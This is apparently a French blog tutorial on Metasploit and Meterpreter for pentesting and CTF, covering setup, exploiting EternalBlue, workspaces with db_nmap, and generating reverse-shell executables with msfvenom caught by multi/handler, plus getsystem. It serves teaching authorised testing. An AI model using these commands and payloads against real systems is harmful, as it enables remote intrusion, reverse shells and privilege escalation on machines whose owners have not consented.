---
title: Meterpreter
meta_title: ""
description: Meterpreter est un framwork très utile pour le pentest et le CTF qu'il faut apprendre à maitriser.
date: 2024-04-04T05:00:00Z
image: /images/logo_meterpreter.png
categories:
  - Outils
author: Emma.exe
tags:
  - outils
  - meterpreter
  - rapid7
  - metasploit
draft: false
---

## Introduction

Meterpreter est un framework comportement de nombreux exploit, payloads, et scanners en tout genre prêt à l'emploi.
Il peut être un allié redoutable.

## Installation

Même si le framework Metasploit vient de façon préinstaller avec Kali Linux, il ne démarre pas avec une base de données par défaut.
Même s'il n'est pas indispensable de travailler avec la base de données, cela offre de nombreuses fonctionnalités supplémentaires : 
- Stocker des informations,
- Garder des traces des essais d'exploitations
- Sauvegarder sa progression pour la reprendre plus tard
- ...

  Metasploit utilise PostrgreSQL, qui, par défaut, n'est activé sur Kali.
  On peut donc commencer par initialiser le service en tapant la commande suivante :
  ```sh
  sudo msfdb init
  ```

On active le service pour qu'il soit démarré à chaque démarrage : 
```sh
sudo systemctl enable postgresql
```

Puis on démarre msfconsole : 
```sh
sudo msfconsole
```

> Pour cacher la bannière et les informations de version au démarrage on peut ajouter l'option `-q` (pour quiet) à la commande msfconsole.

On peut maintenant vérifier la connectivité à la base de données en tapant la commande : 
```sh
db_status
```

Si la database est bien connecté, cela ffichera le message suivant : 
```sh
[*] Connected to msf. Connection type: postgresql.
```
Vous pouvez maintenant utiliser la ligne de commande.

## Commandes

Les commandes sont divisés en plusieurs catégories : 
- Core Commands
- Module Commands
- Job Commands
- Resource Script Commands
- Database Backend Commands
- Credentials Backend Commands
- Developer Commands

On peut obtenir de l'aide en tapant simplement la commande `help`, où l'on voit toutes ces catégories et les commandes qu'elles contiennent.

### Commandes basiques

Prenons un exemple concret pour expliquer le fonctionnement basique de Metasploit : vous avez trouvé la vulnérabilité MS17-10 (EternalBlue) sur une machine et vous souhaitez l'exploiter avec Metasploit.
Pour cela, il faut commencer par faire une recherche d'exploit dans la base de données :
```sh
search exploit EternalBlue
```
Résultats : 
```sh
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/smb/smb_doublepulsar_rce

```

On choisit d'utiliser le premier module de la liste.
Pour cela, nous pouvons taper au choix les commandes suivantes : 
```sh
use 0 # où 0 est la colonne '#' dans les résultats
```
OU en utilisant le chemin vers l'exploit :
```sh
use exploit/windows/smb/ms17_010_eternalblue
```

Il faut maintenant configurer le module afin qu'il trouve notre cible et qu'il nous restitue un shell.
Pour cela, il faut regarder les options : 
```sh
show options
```

Résultats :
```sh
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
                                             loit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
                                              Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
                                             t machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Win
                                             dows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
                                             chines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Serve
                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.57.129   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

```

Ici, nous voyons que nous devons configurer au minimum la variable RHOSTS.
Les autres options sont déjà renseignées ou facultatives.
Comme indiqué dans la description, RHOSTS doit contenir la ou les IP cibles : 
```sh
set RHOSTS <ip-cible>
```

Vérifiez que les autres informations sont correctes par rapport à votre propre contexte.
Il est souvent nécessaire de changer la variable LHOST (Listen address), surtout dans le cas des machines HackTheBox et Offsec, qui utilise le VPN.
Dans ce cas, il faut entrer l'IP de l'interface du VPN (sous Linux, souvent appelé tun0).

Une fois que toutes les options ont été configurés correctement, il ne reste plus qu'à lancer l'attaque avec la commande: 
```sh
run
```

### Workspaces

L'avantage d'avoir mis en place la base de données est que l'on va pouvoir utiliser les workspaces ! 
Metasploit est capable de stocker toutes les informations que nous récoltons au cours d'un pentest.
Lorsque nous relançons metasploit après un test d'intrusion, les informations existent toujours dans la base de données et risquent de se mélanger à de futures pentest.
Pour éviter ce problème, on utilise les workspaces.

La commande `workspace` permet de lister tous les workspaces existants.
On peut passer d'un workspace à un autre en ajoutant son nom à la commande.
Si on crée un nouveau workspace, on peut fournir son nom avec l'option `-a`.

```sh
msf6 > workspace
* default

msf6 > workspace -a workspace1
[*] Added workspace: workspace1
[*] Workspace: workspace1
```

Une fois crée, nous sommes automatiquement dans le workspace.

Nous pouvons maintenant remplir la base de données.
Premièrement, on utilise la commande `db_nmap` qui et wrapper qui exécute Nmap à l'intérieur de Metasploit et stocke les résultats. 

```sh
msf6 > db_nmap -A 192.168.45.202
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 03:48 EDT
[*] Nmap: Nmap scan report for 192.168.45.202
[*] Nmap: Host is up (0.11s latency).
[*] Nmap: Not shown: 993 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
...
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 67.72 seconds
```

Pour lister les hôtes découverts, on tape la commande `hosts` :
```sh
msf6 > hosts

Hosts
=====

address         mac  name  os_name       os_flavor  os_sp  purpose  info  comments
-------         ---  ----  -------       ---------  -----  -------  ----  --------
192.168.45.202             Windows 2016                    server
```

On peut aussi taper la commande `services` pour afficher les services découverts :
```sh
msf6 > services
Services
========

host            port  proto  name           state  info
----            ----  -----  ----           -----  ----
192.168.45.202  135   tcp    msrpc          open   Microsoft Windows RPC
192.168.45.202  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
192.168.45.202  445   tcp    microsoft-ds   open
192.168.45.202  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services

msf6 > services -p 3389
Services
========

host            port  proto  name  state  info
----            ----  -----  ----  -----  ----
192.168.45.202  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services

```

## Création de reverse-shell

### Différence staged et stagedless

Imaginons que nous avons à faire à une vulnérabilité de type Buffer-OverFlow dans un service.
Nous avons besoin de connaître la taille du buffer dans lequel notre shellcode va être stocké.
Si la taille de notre shellcode dépasse la taille du buffer, notre exploitation va échouer.
Dans des situations comme celle-ci, il est important de bien choisir son payload.

Ainsi, un payload stagedless est envoyé dans son entièreté avec l'exploit. Ces payloads "all-in-one" sont les plus fiables.

A l'inverse, un staged payload est utilisé en deux temps. La première partie contient un petit payload primaire qui permet à la machine cible de se connecter à la machine attaquante, puis à transférer un payload plus grand qui contient le reste du shellcode et qui l'exécute.

Le caractère "/" est utilisé pour différencier un shellcode staged d'un stagedless.
Exemple : shell_reverse_tcp est stagedless et shell/reverse_tcp est staged.

Dans meterpreter, vous pouvez utiliser la commande suivante pour voir tous les payloads disponibles : 
```sh
show payloads
```

### msfvenom

Metasploit fournir aussi la possibilité d'exporter les payloads dans différents formats (binaire Windows et Linux, webshells etc) grâce à msfvenom.
msfvenom est un outil standalone qui permet de générer ces payloads.

Nous pouvons par exemple commencer par créer un payload pour un Windows.
Si nous ne savons pas quels payloads utilisés, nous pouvons commencer par lister les payloads disponibles pour Windows :
```sh
msfvenom -l payloads --platform windows --arch x64
```

On peut choisir entre un staged et un non staged.
Dans cette exemple, on utilisera un non staged.

On utilise l'option `-p` pour spécifier le payload. On le configure ensuite avec les options LHOST et LPORT pour spécifier au payload où est-ce qu'il doit retourner son shell.
On utiliser l'option `-f` pour spécifier le format du payload et `-o` pour le fichier de sortie.

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
```

## Récupérer un reverse-shell avec Meterpreter

Il existe de nombreuses façons de récupérer un shell avec Meterpreter mais voici une méthode universelle.

Premièrement, le payload créer doit être un payload `meterpreter`.
Exemple : 
```sh
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
```

Dans un second temps, lancer msfconsole et utiliser le module `multi/handler`.
Ce module permet de récupérer n'importe quel type de shell, tant qu'il y a été conçu pour meterpreter.
```sh
use multi/handler
```

Il faut ensuite configurer les bonnes options afin de bien réceptionner le shell.
Premièrement il faut configurer le même payload que pour le msfvenom : 
```sh
set PAYLOAD windows/x64/meterpreter_reverse_https
```

Ensuite, il faut configurer les options LHOST et LPORT :
```sh
set LHOST 192.168.119.2
set LPORT 443
```

On lance maintenant le listener : 
```sh
run
```

Maintenant, nous n'avons plus qu'à lancer l'attaque vers la machine cible, et le multi/handler va récupérer la session !

Une fois dans la session, on peut utiliser les commandes Meterpreter pour intergir avec la session. Parmi elle : 
```sh
shell # Pour obtenir un shell interactif
getsystem # Pour obtenir les droits système si une faille connue le permet
getuid # Pour obtenir l'UID de l'utilisateur courant
```

Pour aller plus loin : https://docs.metasploit.com 
